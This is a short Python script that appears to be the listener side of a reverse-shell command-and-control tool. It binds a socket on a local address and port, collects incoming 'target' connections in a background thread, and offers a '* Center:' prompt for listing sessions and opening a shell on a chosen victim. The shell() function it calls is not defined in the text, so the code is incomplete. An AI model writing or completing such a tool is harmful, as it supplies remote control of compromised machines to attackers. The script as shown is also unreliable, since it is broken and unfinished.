#!/usr/bin/python

import socket
import json
import os
import base64
import threading

def server():
    global clients
    while True:
        s.settimeout(1)
        try:
            target , ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + "----" + str(ips[clients]) + " Has connected")
            clients +=1
        except:
            pass

global s
ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
s.bind(("192.168.0.21", 54321))
s.listen(5)

clients = 0
stop_threads = False
t1 = threading.Thread(target=server)
t1.start()

while True:
    command = input("* Center: ")
    if command == "target":
        count = 0
        for ip in ips:
            print("session  " + str(count) + " <-->." + str(ip))
            count += 1
    elif command[:7] == "session":
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            shell(tarnum, tarip)
        except:
            print("[!!] No session Under The Number.")